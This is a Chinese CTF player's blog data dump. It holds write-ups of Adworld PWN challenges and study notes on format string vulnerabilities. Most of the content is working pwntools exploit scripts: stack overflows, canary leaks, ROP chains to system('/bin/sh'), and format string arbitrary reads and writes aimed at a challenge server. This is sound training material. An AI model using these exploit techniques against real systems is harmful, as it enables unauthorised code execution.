{"meta":{"title":"zsky's Blog","subtitle":"","description":"某211研一在读|CTF_RE选手|tcl","author":"zsky","url":"https://zzzzsky.github.io","root":"/"},"pages":[{"title":"记录本fw的学习","date":"2021-11-18T14:37:07.000Z","updated":"2021-11-29T12:15:58.760Z","comments":true,"path":"about/index.html","permalink":"https://zzzzsky.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-11-18T14:36:52.000Z","updated":"2021-11-29T12:15:03.610Z","comments":true,"path":"categories/index.html","permalink":"https://zzzzsky.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-11-18T14:36:30.000Z","updated":"2021-11-29T12:15:43.104Z","comments":true,"path":"tags/index.html","permalink":"https://zzzzsky.github.io/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-11-18T14:37:07.000Z","updated":"2021-11-29T12:15:24.996Z","comments":true,"path":"link/index.html","permalink":"https://zzzzsky.github.io/link/index.html","excerpt":"","text":""}],"posts":[{"title":"攻防世界PWN刷题1","slug":"pwn刷题1","date":"2022-04-01T13:41:00.000Z","updated":"2022-04-01T13:42:18.176Z","comments":true,"path":"2022/04/01/pwn刷题1/","link":"","permalink":"https://zzzzsky.github.io/2022/04/01/pwn%E5%88%B7%E9%A2%981/","excerpt":"","text":"攻防世界PWN刷题11. dice_gameXCTF 4th-QCTF-2018 IDA打开程序分析，发现是一个随机数的小游戏 在这个地方存在溢出，可以把seed给覆盖掉，把seed覆盖为0，然后自己写个程序看随机数 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; srand(0); for(int i =0; i &lt; 50; i ++) &#123; int tmp = rand() % 6 + 1; printf(&quot;%d, &quot;, tmp); &#125; return 0;&#125; 然后写EXP即可 12345678910111213141516171819from pwn import *context.log_level = &quot;debug&quot;# io = process(&quot;dice_game&quot;)io = remote(&quot;111.200.241.244&quot;, 53975)payload = b&#x27;A&#x27;* 55payload = payload.ljust(0x48, b&#x27;\\x00&#x27;)number = [2, 5, 4, 2, 6, 2, 5, 1, 4, 2, 3, 2, 3, 2, 6, 5, 1, 1, 5, 5, 6, 3, 4, 4, 3, 3, 3, 2, 2, 2, 6, 1, 1, 1, 6, 4, 2, 5, 2, 5, 4, 4, 4, 6, 3, 2, 3, 3, 6, 1]io.sendafter(&quot;name: &quot;, payload)for i in range(50): io.sendlineafter(&quot;6): &quot;, str(number[i]).encode())io.recvuntil(&quot;\\n&quot;)flag = io.recv()log.info(&quot;flag: %s&quot; % flag) 2. forgotbackdoorctf-2015 IDA打开分析，程序存在后门，地址是0x80486CC的位置，只需要让程序最终执行这个函数就OK了 exp为： 12345678910111213141516171819202122232425from pwn import *context.log_level = &quot;debug&quot;# io = process(&quot;d033ab68b3e64913a1b6b1029ef3dc29&quot;)io = remote(&#x27;111.200.241.244&#x27;, 56237)io.sendlineafter(&quot;&gt; &quot;, b&#x27;123&#x27;)payload = b&#x27;A&#x27;*32payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += p32(0x80486CC)payload += b&#x27;A&#x27; * (32 - 4)payload += p32(1)io.sendlineafter(&quot;&gt; &quot;, payload)io.recv() 3. Mary_MortonASIS-CTF-Finals-2017 IDA打开程序分析，发现即存在栈溢出漏洞，也存在格式化字符串漏洞，所以用格式化字符串漏洞泄露canary，然后再利用缓冲区溢出调用后门获取flag 123456789101112131415161718from pwn import *context.log_level = &quot;debug&quot;# io = process(&quot;./22e2d7579d2d4359a5a1735edddef631&quot;)io = remote(&#x27;111.200.241.244&#x27;, 62874)io.sendlineafter(b&quot;battle \\n&quot;, b&#x27;2&#x27;)io.send(b&quot;%23$p&quot;)canary = int(io.recvuntil(&quot;battle \\n&quot;)[:18], 16)log.info(&quot;leak_canary: 0x%x&quot; % canary)backdoor = 0x04008DAio.sendline(b&#x27;1&#x27;)ret_addr = 0x4008EApayload = b&#x27;A&#x27; * 136 + p64(canary) + b&#x27;A&#x27;*8 + p64(ret_addr) + p64(backdoor) # 加ret是为了对齐io.send(payload)io.recvuntil(&#x27;\\n&#x27;)flag = io.recv()log.info(&quot;flag: &#123;&#125;&quot;. format(flag)) 4. stack2XCTF 4th-QCTF-2018 IDA打开程序分析，这个地方存在泄露，可以将返回地址覆盖掉 本来是把返回地址覆盖为hackhere函数，但是pwn的时候，系统显示找不到bash。。。然后又利用puts函数打印出puts的地址和__libc_start_main的地址去libc-database搜，但是搜不到对应的libc，又想在栈上构造/bin/sh，但是无法泄露出栈的地址，，，无奈之下，看了别人的WP，原来执行system(sh)也可以，不用加路径。。。。EXP为 12345678910111213141516171819202122232425262728from pwn import *# io = process(&#x27;3fb1a42837be485aae7d85d11fbc457b&#x27;)\\io = remote(&quot;111.200.241.244&quot;, 50279)# context.log_level = &quot;debug&quot;backdoor = 0x804859Bbackdoor_addr_bytes = p32(backdoor)io.sendlineafter(&quot;you have:\\n&quot;, b&#x27;0&#x27;)def auto_send(data, _offset=132): # 132 is return address for i in range(len(data)): io.sendlineafter(&#x27;exit\\n&#x27;, b&#x27;3&#x27;) io.sendlineafter(&#x27;number to change:\\n&#x27;, str(_offset+i).encode()) io.sendlineafter(&#x27;new number:\\n&#x27;, str(data[i]).encode()) sh_addr = 0x8048987system_addr = 0x8048450payload = p32()+ b&#x27;A&#x27; * 4 + p32(sh_addr)auto_send(payload)io.sendlineafter(&#x27;exit\\n&#x27;, b&#x27;5&#x27;)io.interactive() 5. pwn-100L-CTF-2016 泄露地址 1234567891011121314151617181920212223242526272829303132from pwn import *from binascii import *io = process(&quot;bee9f73f50d2487e911da791273ae5a3&quot;)io = remote(&quot;111.200.241.244&quot;, 61302)elf = ELF(&quot;bee9f73f50d2487e911da791273ae5a3&quot;)pop_rdi_addr = 0x00400763context.log_level = &quot;debug&quot;payload = b&#x27;A&#x27; * 72 + p64(pop_rdi_addr) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;setbuf&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;read&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;__libc_start_main&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload = payload.ljust(200, b&#x27;A&#x27;)io.send(payload)io.recvuntil(&quot;bye~\\n&quot;)res = io.recvline(6)log.info(&quot;puts: %s&quot; % hexlify(res[::-1][1:]))res = io.recvline(6)log.info(&quot;setbuf: %s&quot; % hexlify(res[::-1][1:]))res = io.recvline(6)log.info(&quot;read: %s&quot; % hexlify(res[::-1][1:]))res = io.recvline(6)log.info(&quot;__libc_start_main: %s&quot; % hexlify(res[::-1][1:])) 然后去libc-database查询libc exp为 1234567891011121314151617181920212223242526272829303132from pwn import *from binascii import *# io = process(&quot;bee9f73f50d2487e911da791273ae5a3&quot;)io = remote(&quot;111.200.241.244&quot;, 61302)elf = ELF(&quot;bee9f73f50d2487e911da791273ae5a3&quot;)pop_rdi_addr = 0x00400763puts_offset = 0x6f690str_bin_sh_offset = 0x18cd57system_offset = 0x45390read200func_addr = 0x040068Econtext.log_level = &quot;debug&quot;payload = b&#x27;A&#x27; * 72 + p64(pop_rdi_addr) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) + p64(read200func_addr)payload = payload.ljust(200, b&#x27;A&#x27;)io.send(payload)io.recvuntil(&quot;bye~\\n&quot;)puts_addr = u64(io.recvline()[:-1].ljust(8, b&#x27;\\x00&#x27;))log.info(&quot;puts : %s&quot; % hex(puts_addr))libc_base = puts_addr - puts_offsetpayload = b&#x27;A&#x27; * 72 + p64(pop_rdi_addr) + p64(libc_base + str_bin_sh_offset) + p64(libc_base + system_offset)payload = payload.ljust(200, b&#x27;A&#x27;)io.send(payload)io.recvuntil(&quot;bye~\\n&quot;)io.interactive() 6. warmupcsaw-ctf-2016-quals 题目没有附件，先nc看看 程序输出了一个地址，因为是0X400000 + 0X60D猜测这是get_shell或输出flag的地址，然后让咱们输入，输入格式化字符串的数据并没有什么效果，猜测是栈溢出，然后写脚本爆破即可 123456789101112131415161718from pwn import *addr = 0x40060ddef pwn(): for i in range(0, 100): payload = b&#x27;A&#x27; * i + p64(addr) try: io = remote(&quot;111.200.241.244&quot;, 51136) io.sendlineafter(&quot;&gt;&quot;, payload) # sleep(0.1) c = io.recv() log.info(&quot;&#123;&#125;: Info: &#123;&#125;&quot;.format(i, c)) continue except EOFError as e: log.info(&quot;badsize: %d&quot; % i) io.close()pwn() 7. 反应釜开关控制XCTF 4th-CyberEarth 下载附件，IDA查看就是普通的栈溢出，溢出3次，即可getshell，或者第一次溢出就改为get shell的地址 1234567891011121314151617181920212223242526from pwn import *io = process(&quot;./ad72d90fbd4746ac8ea80041a1f661c2&quot;)io = remote(&quot;111.200.241.244&quot;, 51643)io.recvuntil(&quot;witch is:&quot;)easy_addr = int(io.recvuntil(&quot;\\n&quot;).decode(), 16)log.info(&quot;easy addr: 0x%x&quot; % easy_addr)payload1 = b&#x27;A&#x27; * 520 + p64(easy_addr)io.sendline(payload1)io.recvuntil(&quot;witch is:&quot;)normal_addr = int(io.recvuntil(&quot;\\n&quot;).decode(), 16)log.info(&quot;normal addr: 0x%x&quot; % normal_addr)payload2 = b&#x27;A&#x27; * 392 + p64(normal_addr)io.sendline(payload2)io.recvuntil(&quot;witch is:&quot;)shell_addr = int(io.recvuntil(&quot;\\n&quot;).decode(), 16)log.info(&quot;shell addr: 0x%x&quot; % shell_addr)payload3 = b&#x27;A&#x27;* 264 + p64(shell_addr)io.sendline(payload3)io.interactive() 8. 实时数据监测IDA打开分析，格式化字符串漏洞，直接用fmtstr_payload 构造payload即可 123456789101112from pwn import *key_address = 0x0804A048value = 0x2223322# io = process(&quot;9926c1a194794984978011fc619e3301&quot;)io = remote(&#x27;111.200.241.244&#x27;, 62045)payload = fmtstr_payload(12, &#123;key_address: value&#125;)io.send(payload)io.interactive() 9. welpwnRCTF-2015 IDA打开程序分析 这个位置存在栈溢出漏洞，但是会被\\0截断，在strcmp那里下断点，即让它复制完之后下断点，观察栈的数据，发现截断后的数据紧跟着原始数据 这样就可以构造ROP链泄露出puts的地址，进而搜到libc的地址，然后再找到system的地址就OK了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *elf = ELF(&quot;81f42c219e81421ebfd1bedd19cf7eff&quot;)# io = process(&quot;81f42c219e81421ebfd1bedd19cf7eff&quot;)# io =remote(&quot;111.200.241.244&quot; ,64634)# io = remote(&#x27;127.0.0.1&#x27;, 10001)io = remote(&quot;111.200.241.244&quot;, 62546)context.log_level = &quot;debug&quot;c = io.recv()pop_rdi_addr = 0x04008a3pop_r13_r14_r15_addr = 0x040089epayload = b&#x27;A&#x27; * 24payload += p64(pop_r13_r14_r15_addr)payload += b&#x27;A&#x27; * 24payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) # shellcode startpayload += p64(pop_rdi_addr) + p64(elf.got[&#x27;write&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;read&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(0x0004007CD) # func mainio.sendline(payload)io.recvuntil(b&quot;\\x40&quot;)puts_addr_byte = u64(io.recvline(6)[:-1].ljust(8, b&#x27;\\x00&#x27;))log.info(&quot;puts_addr: %s&quot; % hex(puts_addr_byte))write_addr_byte = u64(io.recvline(6)[:-1].ljust(8, b&#x27;\\x00&#x27;))log.info(&quot;write_addr: %s&quot; % hex(write_addr_byte))read_addr_byte = u64(io.recvline(6)[:-1].ljust(8, b&#x27;\\x00&#x27;))log.info(&quot;read_addr: %s&quot; % hex(read_addr_byte))libc_base = write_addr_byte - 0xf72b0ret_addr = 0x00004007CClog.info(&quot;libc_base: %s&quot; % hex(libc_base))system_address = libc_base + 0x45390str_bin_sh_address = libc_base + 0x18cd57payload2 = b&#x27;A&#x27; * 24payload2 += p64(pop_r13_r14_r15_addr)payload2 += b&#x27;A&#x27; * 24payload2 += p64(ret_addr)payload2 += p64(pop_rdi_addr) + p64(str_bin_sh_address)payload2 += p64(system_address)io.sendline(payload2)io.interactive() 这里有个地方要注意一下 在构造ROP链的时候直接打印puts，write，read函数地址，然后如果下面没有stop gadget的话，在下面ecv()的时候，如果是process就可以接收到，但是remote就EOF了，如果在构造ROP链的时候在 p64(pop_rdi_addr) + p64(elf.got[‘puts’]) + p64(elf.plt[‘puts’]) 之后加一个stop gadgets，这样就可以了，估计是没加stop_gadgets，还没有recv，程序就挂了, 比如下面这种代码 123456789101112131415161718192021from pwn import *elf = ELF(&quot;81f42c219e81421ebfd1bedd19cf7eff&quot;)io = remote(&#x27;127.0.0.1&#x27;, 10001)context.log_level = &quot;debug&quot;c = io.recv()pop_rdi_addr = 0x04008a3pop_r13_r14_r15_addr = 0x040089epayload = b&#x27;A&#x27; * 24payload += p64(pop_r13_r14_r15_addr)payload += b&#x27;A&#x27; * 24payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) # shellcode startpayload += p64(pop_rdi_addr) + p64(elf.got[&#x27;write&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;read&#x27;]) + p64(elf.plt[&#x27;puts&#x27;]) # payload += p64(0x004007CD) 如果没有这一行的话会出错，0x4007CD是main函数的地址io.sendline(payload)io.recv() 10. pwn1厦门邀请赛 IDA打开分析 存在栈溢出漏洞，但是程序开了栈保护，所以得首先泄露出canary 由于程序是输入2是打印，所以可以输入足够长的数据一直到正好不覆盖canary，然后输入1，将cannary顺带这打印出来，就达到了泄露canary的目的， 这样就可以构造ROP链打印puts函数地址然后再返回main函数，打印puts函数地址是为了获取libc的基地址，进而获得system函数的地址，重新回到main函数这里是为了再次输入构造ROP链执行system(“bin/sh”)，但是执行system(“bin/sh”)的时候有问题，服务器总是提示错误，于是我将bin/sh的地址换成了ls的地址，可以打印出目录下的文件，所以还需要调用read函数。输入’cat flag’， 然后执行system(‘cat flag’) cat flag字符串把它存在0x601000的位置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *elf = ELF(&quot;babystack&quot;)# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # io = process(&quot;babystack&quot;)libc = ELF(&quot;libc-2.23.so&quot;)io = remote(&quot;111.200.241.244&quot;, 56538)context.log_level = &quot;debug&quot;pop_rdi_addr = 0x0400a93pop_rsi_r15_addr = 0x0400a91main_addr = 0x0400908payload = b&quot;A&quot; * 136io.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;1&#x27;)io.sendline(payload)io.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;2&#x27;)io.recvuntil(b&quot;\\n&quot;)cnanry_byte = io.recv(7)canary = u64(cnanry_byte.rjust(8, b&#x27;\\x00&#x27;))log.info(&quot;canary : 0x%x&quot; % canary)io.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;1&#x27;)cat_flag_addr = 0x000000601000 payload = b&#x27;A&#x27; * 136 + p64(canary) +p64(0)payload += p64(pop_rdi_addr) + p64(elf.got[&#x27;puts&#x27;]) + p64(elf.plt[&#x27;puts&#x27;])payload += p64(pop_rdi_addr) + p64(0) # rdi = 0payload += p64(pop_rsi_r15_addr) +p64(cat_flag_addr) + p64(0) # rsi = 0x00000601000 payload += p64(elf.plt[&#x27;read&#x27;]) # read(0, rsi, ?) #payload += p64(main_addr) # 重新回到main函数，为了 执行system(&quot;cat flag&quot;)io.send(payload)io.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;3&#x27;)puts_address = u64(io.recv(6).ljust(8, b&#x27;\\x00&#x27;))log.info(&quot;puts_address: %s&quot; % hex(puts_address))libc_base = puts_address - libc.symbols[&#x27;puts&#x27;]log.info(&quot;libc_base: %s&quot; % hex(libc_base))io.send(b&#x27;cat flag&#x27;) #read函数的时候，输入cat flagio.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;1&#x27;)system_addr = libc_base + libc.symbols[&#x27;system&#x27;]payload = b&quot;A&quot; * 136 + p64(canary) +p64(0)payload += p64(0x400A2A)# retpayload += p64(pop_rdi_addr) + p64(cat_flag_addr) + p64(system_addr)io.send(payload)io.sendafter(b&quot;&gt;&gt; &quot;, b&#x27;3&#x27;)io.recv()","categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"}]},{"title":"第9章_格式化字符串","slug":"第9章_格式化字符串","date":"2022-03-27T08:47:00.000Z","updated":"2022-03-27T08:47:57.091Z","comments":true,"path":"2022/03/27/第9章_格式化字符串/","link":"","permalink":"https://zzzzsky.github.io/2022/03/27/%E7%AC%AC9%E7%AB%A0_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"基本原理格式化字符串漏洞如今在桌面端已经比较少见了，但在物联网设备上依然层出不穷。 原理通过一个例子来说明 1234567#include &lt;stdio.h&gt;int main()&#123; printf(&quot;%s %d %s %x %x %x %3$s&quot;, &quot;Hello World!&quot;, 233, &quot;test&quot;); return 0;&#125; 1gcc -g -m32 -z execstack -no-pie -fno-stack-protector main.c gdb 调试起来，在printf函数那下断点，观察参数 此时栈上的参数为这些（绿色），但是%s %d %s %x %x %x %3$s ( %$3s 是打印可变参数中的第3个，以字符串的形式打印), 但是由于格式化要求的参数和实际提供的参数不一致，所以它会继续从栈上取参数，即红色的部分，这样就造成了数据的泄露 所以，格式化字符串漏洞发生的条件就是 格式字符串要求的参数和实际提供的参数不匹配 漏洞利用对于格式化字符串漏洞的利用主要有：使程序崩溃、栈数据泄露、任意地址内存泄露、栈数据覆盖、任意地址内存覆盖 使程序崩溃在Linux中，存取无效的指针会使进程收到SIGSEGV信号，从而使程序非正常终止并产生核心转储，其中存储了程序崩溃时的许多重要信息，而这些信息正是攻击者所需要的。使用类似下面的格式字符串即可触发崩溃。 1printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;); 对于每一个%s, printf 都要从栈上获取一个数字，将其视为字符串的地址进行打印，直到出现一个空字符 获取的某个数字可能不是一个地址 获取的数字确实是一个地址，但是这个地址时受保护的 栈数据泄露使程序崩溃只是验证漏洞的第一步，攻击者还可以利用格式化函数获得内存数据，为漏洞利用做准备。 用以下代码测试 123456789101112#include &lt;stdio.h&gt;int main()&#123; char format[128]; int arg1 = 1, arg2 =0x88888888, arg3 = -1; char arg4[10] = &quot;ABCD&quot;; scanf(&quot;%s&quot;, format); printf(format, arg1, arg2, arg3, arg4); printf(&quot;\\n&quot;); return 0; 12echo 0 &gt; /proc/sys/kernel/randomize_va_spacegcc -m32 -fno-stack-protector -no-pie main.c -o fmtdemo 输入 %08x.%08x.%08x.%08x.%08x 作为格式化字符串 观察栈，绿框中是5个参数 因为输入了5个%08x，所以在可变参数中要打印出5个来，而现在只有4个，剩下那个它就顺着栈继续往下找了，即打印的0xffffcf64 现在已经知道了如何按顺序泄露栈数据，那么如果想直接泄露指定的某个数据，则可以用下面类似的格式字符串，这里的n表示位于格式字符串后的第n个数据，即可变参数中第几个（从1开始） %&lt;arg#&gt;$&lt;format&gt; 例如 %3$x表示以16进制形式打印第3个可变参数，下面进行测试 输入: %3$x.%1$08x 输出: 任意地址内存泄露我们可以使用类似%s格式规范，可以泄露出参数（指针）所指向的内存的数据，程序会将它作为一个ASCII字符串处理，直到遇到空字符，如果我们可以操控这个参数的值，那么就可以泄露出任意地址的内容。 输入%4$s，然后在call 0x8048350 &lt;printf@plt&gt;调用前下断点，观察栈的情况 接下来尝试获取任意内存的数据，输入AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 发现0X41414141存在可变参数的第13个位置上，所以，只要输入AAAA%13$s就可以读取0x41414141这个地址的数据了，虽然0x41414141并不是个有效的地址，但是我们可以把它变为合法的地址然后再次输入 比如ABCD字符串的地址是0xffffcf5a，所以我们用此地址测试 1python -c &#x27;print(&quot;\\x5a\\xcf\\xff\\xff.%13$s&quot;)&#x27; &gt; text 于是打印出了字符串ABCD，我们可以利用这种方法，把某函数的GOT地址传进去，这样就可以得到虚拟地址了，然后根据其在libc的偏移吗，就可以得到任意函数地址，比如 system() 1python -c &quot;print(&#x27;\\x18\\xa0\\x04\\x08&#x27; + &#x27;.%13$s&#x27;)&quot; &gt; text 这里用 0x804a00c 这个地址的话会有问题，估计是r &lt; ./text的原因，书上说的是不可见字符的原因，同样会被省略的还有\\x07, \\x08, \\x20等 虽然0xf7e3fe00仍然是个指针，不是字符数据，打印并不成功，但是借助pwntools可以得到地址数据并进行利用（后面看到这里的时候再说。。。。） 栈数据覆盖通过%n转换提示符，可以将当前已经成功写入流或缓冲区的字符个数存储到由参数指定的整数中。 测试代码如下 1234567891011#include &lt;stdio.h&gt;int main()&#123; int i; char str[] = &quot;hello&quot;; printf(&quot;%s %n\\n&quot;, str, &amp;i); printf(&quot;%d\\n&quot;, i); return 0;&#125; 回到fmtdemo那个程序，尝试将argv2改为其他0x20 看到argv2的地址时0xffffcf38，于是构造字符串’\\x38\\xcf\\xff\\xff%08x%08x%012x%13$n’ 在printf那里下断点 任意地址内存覆盖用上面的方法 ‘\\x38\\xcf\\xff\\xff%08x%08x%012x%13$n’ ，只能赋值最小为4的数据，因为前面’\\x38\\xcf\\xff\\xff’ 就占了4个字节 使用’AA%15$nA’ + ‘\\x38\\xcf\\xff\\xff’ 的方法就可以赋值 &lt; 4的数据， 要是赋值一个特别大的数据怎么办，可以直接类似%0123214c的形式，但是这样做占用的内存空间太大，往往会覆盖其他重要的地址而出错。所以，我们尝试通过修改长度修饰符来更改值的大小。 %hhn(单字节), %hn(双字节), %n(4字节), %ln(8字节), %lln(16字节) 接下来我们尝试将0x12345678写入到0xffffcf38的位置, 先尝试输入AAAABBBBCCCCDDDD来看看这几个参数的位置。发现是可变参数的13,14,15,16的位置 12340xffffcf64 -&gt; 0x41414141 (0xffffcf38) -&gt; \\x780xffffcf68 -&gt; 0x42424242 (0xffffcf39) -&gt; \\x560xffffcf6c -&gt; 0x43434343 (0xffffcf40) -&gt; \\x340xffffcf70 -&gt; 0x44444444 (0xffffcf41) -&gt; \\x12 构造特殊格式化字符 12&#x27;\\x38\\xcf\\xff\\xff&#x27; + &#x27;\\x39\\xcf\\xff\\xff&#x27;+ &#x27;\\x3a\\xcf\\xff\\xff&#x27;+ &#x27;\\x3b\\xcf\\xff\\xff&#x27; + &#x27;%104c%13$hhn&#x27; + &#x27;%222c%14$hhn&#x27; + &#x27;%222c%15$hhn&#x27; + &#x27;%222c%16$hhn&#x27; 1echo &quot;\\x38\\xcf\\xff\\xff\\x39\\xcf\\xff\\xff\\x3a\\xcf\\xff\\xff\\x3b\\xcf\\xff\\xff%104c%13\\$hhn%222c%14\\$hhn%222c%15\\$hhn%222c%16\\$hhn&quot; &gt; text 运行printf之后 x86-64中的格式化字符串漏洞在Linux中，前6个参数分别通过RDI, RSI, RDX, RCX, R8, R9传递，在Windows中，前4个参数通过RCX, RDX, R8, R9传递。 将程序编译成64位 1gcc -g -z execstack -no-pie -fno-stack-protector main.c -o fmtdemo64 gdb调试， 输入 AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 可以发现AAAAAAAA在%8$p的位置，这个时候我们无法修改argv2的值了，因为她被放在了寄存器中 fmtstr模块通过下面例子练习fmtstr模块 123456789101112#include &lt;stdio.h&gt;int main()&#123; char str[1024]; while(1)&#123; memset(str, &#x27;\\0&#x27;, 1024); read(0, str, 1024); printf(str); fflush(stdout); &#125; return 0;&#125; 为了方便测试，关闭ASLR， 关闭PIE。思路就是将printf的地址改为system的地址，然后输入参数/bin/sh 来get shell exp为 12345678910111213141516171819202122232425262728293031323334from pwn import *elf = ELF(&quot;./test&quot;)libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)io = process(&#x27;./test&#x27;)def exec_fmt(payload): # 与服务器交互的函数 io.sendline(payload) info = io.recv() return infoauto = FmtStr(exec_fmt) # 在初始化的时候就计算出了offset，假如输入AAAA，则offset的含义就是AAAA在可变参数中第几个，即%&#123;offset&#125;$soffset = auto.offset # print(offset)printf_got = elf.got[&#x27;printf&#x27;] payload = p32(printf_got) + &#x27;%&#123;&#125;$s&#x27;.format(offset).encode(&#x27;ascii&#x27;) # 获取printf_got这个地址的数据，即printf的地址io.send(payload)printf_addr = u32(io.recv()[4:8])libc_address = printf_addr - libc.symbols[&#x27;printf&#x27;]system_addr = libc_address + libc.symbols[&#x27;system&#x27;] # 根据偏移获取system的地址log.info(&quot;system_addr : %s&quot; % hex(system_addr)) payload = fmtstr_payload(offset, &#123;printf_got : system_addr&#125;) # 将printf_got这个地址处的数据改为system_addrio.send(payload) io.send(&#x27;/bin/sh&#x27;) # 此时printf已经改为了system，发送/bin/sh获取shellio.recv()io.interactive() HITCON CMT 2017: pwn200本题没有从网上找到附件，因为书上给了源码，直接手动编译下 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void canary_protect_me(void)&#123; system(&quot;/bin/sh&quot;);&#125;int main()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin,0,1, 0); char buf[40]; gets(buf); printf(buf); gets(buf); return 0;&#125; 1gcc -m32 -z noexecstack -no-pie pwn200.c -o pwn200.c 程序开启了Canary，而程序也留有1个后门canary_protect_me，所以我们通过格式化漏洞泄露出canary的值，然后再栈溢出漏洞覆盖掉返回值 因为最后这里，esp = [ebp-4]-4, 所以我们要知道ebp的值，然后+4，填到这个位置。（这也导致了下面的EXP和书上的有所不同 搭建pwn环境 1nohup socat tcp4-listen:10001,reuseaddr,fork exec:./pwn200 &amp; EXP为: 12345678910111213141516171819from pwn import *backdoor = 0x8048566#io = process(&quot;./pwn200&quot;)io = remote(&#x27;127.0.0.1&#x27;, 10001)payload1 = b&quot;%15$x&quot;ebp = 0xffffcf98 # 通过调试得到 &quot;%17$x&quot;得到的数 - 24 就是EBP的值，所以多次尝试，发现%17$x的值一样io.sendline(payload1)canary = int(io.recv().decode(), 16)log.info(&quot;canary: &quot;+ hex(canary))payload2 = b&#x27;A&#x27;* 40 + p32(canary) + b&#x27;A&#x27;*4 + p32(ebp+4)+ p32(backdoor)# gdb.attach(io)# pause()io.sendline(payload2)# pause()io.interactive() 这里写上了EBP的地址，但我知道其实做法肯定是不对的，玩意ebp每次都变，那么将无解，所以正确的做法这里我也不会，(以后碰到了有同种类型的题再研究 NJCTF2017: pingme本题没有给出二进制文件，但是通过输入输出猜测是格式化字符串漏洞，可以无限利用漏洞，于是先把程序dump下来 搭建本地环境 1nohup socat tcp4-listen:10001,reuseaddr,fork exec:./pingme &amp; 12345678910111213141516171819202122232425262728293031323334from pwn import *io = remote(&quot;127.0.0.1&quot;, 10001)def exec_fmt(payload): io.sendline(payload) info = io.recv() return infodef dump_memory(start_addr, end_addr): result = b&quot;&quot; while start_addr &lt; end_addr: io = remote(&quot;127.0.0.1&quot;, 10001) io.recvline() payload = b&quot;%9$s.AAA&quot; + p32(start_addr) io.sendline(payload) data = io.recvuntil(b&#x27;.AAA&#x27;)[:-4] if data == b&quot;&quot;: data = b&quot;\\x00&quot; log.info(&quot;leaking: &#123;0&#125; --- &gt; &#123;1&#125;&quot;.format(hex(start_addr), data)) result += data start_addr += len(data) io.close() return resultio.recvline()auto = FmtStr(exec_fmt)offset = auto.offsetprint(offset) # 7start_addr = 0x8048000end_addr = 0x8049000code_bin = dump_memory(start_addr, end_addr)with open(&quot;code.bin&quot;, &quot;wb&quot;) as f: f.write(code_bin) 成功将程序dump下来，思路是将printf的地址修改为system的地址，然后输入/bin/sh获取shell 对于获取libc的基地址以及system函数的地址有2种方法，第一种方法是泄露出printf函数的地址，然后根据此地址去libc-database去查询，第二种方法用DynELF来获取system的地址，这里第一种方法失败了，不知道为啥，这里先记录下（假设能成功。。。。能以后了解的多了再回来解决这个问题 方法一先查询got表 12345678910111213141516171819readelf -r code.bin Relocation section &#x27;.rel.dyn&#x27; at offset 0x35c contains 3 entries: Offset Info Type Sym.Value Sym. Name08049960 00000606 R_386_GLOB_DAT 00000000 __gmon_start__080499a0 00000d05 R_386_COPY 080499a0 stdin@GLIBC_2.0080499a4 00000b05 R_386_COPY 080499a4 stdout@GLIBC_2.0Relocation section &#x27;.rel.plt&#x27; at offset 0x374 contains 9 entries: Offset Info Type Sym.Value Sym. Name08049970 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.008049974 00000207 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.008049978 00000307 R_386_JUMP_SLOT 00000000 fgets@GLIBC_2.00804997c 00000407 R_386_JUMP_SLOT 00000000 alarm@GLIBC_2.008049980 00000507 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.008049984 00000707 R_386_JUMP_SLOT 00000000 strchr@GLIBC_2.008049988 00000807 R_386_JUMP_SLOT 00000000 strlen@GLIBC_2.00804998c 00000907 R_386_JUMP_SLOT 00000000 